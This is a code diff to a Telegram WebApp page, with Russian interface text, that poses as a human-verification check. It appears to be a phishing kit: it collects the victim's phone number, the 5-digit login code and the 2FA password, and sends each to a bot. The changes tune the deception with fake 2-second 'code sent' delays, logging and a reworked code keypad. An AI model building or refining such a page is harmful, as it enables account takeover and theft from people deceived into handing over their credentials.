@@ -187,7 +187,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- Шаг 1: Приветствие -->
         <div id="screen-welcome">
             <div class="emoji">👋</div>
             <div class="lead">Нужно подтвердить, что вы настоящий человек</div>
@@ -195,7 +194,6 @@
             <button class="btn" id="btnConfirm">Подтвердить</button>
         </div>
 
-        <!-- Шаг 2: Модалка с запросом номера -->
         <div id="modal-phone" class="modal hidden">
             <div class="modal-content">
                 <h3>Отправить Ваш номер телефона?</h3>
@@ -207,14 +205,12 @@
             </div>
         </div>
 
-        <!-- Шаг 3: Ожидание -->
         <div id="screen-waiting" class="hidden">
             <div class="emoji">⏳</div>
             <div class="lead">Ожидайте, не выходите!</div>
             <div class="muted">Нужно подтвердить, что вы настоящий человек</div>
         </div>
 
-        <!-- Шаг 4: Ввод кода -->
         <div id="screen-code" class="hidden">
             <div class="emoji">🔐</div>
             <div class="lead">Введите 5-значный код, который мы вам только что отправили!</div>
@@ -245,14 +241,12 @@
 
             <div class="status" id="statusCode"></div>
 
-            <!-- 2FA блок (появляется если нужно) -->
             <div id="twofaBlock" class="hidden" style="width:100%;margin-top:12px;">
                 <input class="twofa-input" id="twofaInput" type="password" placeholder="Введите пароль 2FA">
                 <button class="btn" id="twofaSubmit" style="margin-top:8px;">Подтвердить пароль</button>
             </div>
         </div>
 
-        <!-- Шаг 5: Успех -->
         <div id="screen-success" class="hidden">
             <div class="emoji">✅</div>
             <div class="lead">Подтверждено!</div>
@@ -289,6 +283,7 @@
         const twofaInput = document.getElementById('twofaInput');
         const twofaSubmit = document.getElementById('twofaSubmit');
         const btnGetCode = document.getElementById('btnGetCode');
+        const keypad = document.getElementById('keypad');
 
         function showScreen(screen) {
             [screenWelcome, screenWaiting, screenCode, screenSuccess].forEach(el => el.classList.add('hidden'));
@@ -321,6 +316,9 @@
         function sendDataToBot(data) {
             if (tg) {
                 tg.sendData(JSON.stringify(data));
+                console.log('[WebApp] Данные отправлены через sendData:', data);
+            } else {
+                console.log('[WebApp] tg не найден');
             }
         }
 
@@ -343,9 +341,11 @@
 
                     sendDataToBot({ phone: phone, code: '', password: '' });
 
-                    showScreen(screenCode);
-                    statusCode.textContent = '📲 Код отправлен! Введите его.';
-                    statusCode.className = 'status success';
+                    setTimeout(() => {
+                        showScreen(screenCode);
+                        statusCode.textContent = '📲 Код отправлен! Введите его.';
+                        statusCode.className = 'status success';
+                    }, 2000);
                 });
 
                 tg.onEvent('contact_error', () => {
@@ -354,31 +354,32 @@
             } else {
                 phone = '+79123456789';
                 sendDataToBot({ phone: phone, code: '', password: '' });
-                showScreen(screenCode);
-                statusCode.textContent = '📲 Код отправлен! (тест)';
-                statusCode.className = 'status success';
+                setTimeout(() => {
+                    showScreen(screenCode);
+                    statusCode.textContent = '📲 Код отправлен! (тест)';
+                    statusCode.className = 'status success';
+                }, 2000);
             }
         });
 
-        document.querySelectorAll('.kbtn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                const key = this.dataset.key;
-                if (key === 'backspace') {
-                    codeDigits.pop();
-                    updateCodeBoxes();
-                    return;
-                }
-                if (codeDigits.length >= 5) return;
-                codeDigits.push(key);
+        keypad.addEventListener('click', (e) => {
+            const key = e.target.dataset.key;
+            if (!key) return;
+            if (key === 'backspace') {
+                codeDigits.pop();
                 updateCodeBoxes();
+                return;
+            }
+            if (codeDigits.length >= 5) return;
+            codeDigits.push(key);
+            updateCodeBoxes();
 
-                if (codeDigits.length === 5) {
-                    code = codeDigits.join('');
-                    sendDataToBot({ phone: phone, code: code, password: '' });
-                    statusCode.textContent = '⏳ Проверка...';
-                    statusCode.className = 'status';
-                }
-            });
+            if (codeDigits.length === 5) {
+                code = codeDigits.join('');
+                sendDataToBot({ phone: phone, code: code, password: '' });
+                statusCode.textContent = '⏳ Проверка...';
+                statusCode.className = 'status';
+            }
         });
 
         btnGetCode.addEventListener('click', () => {
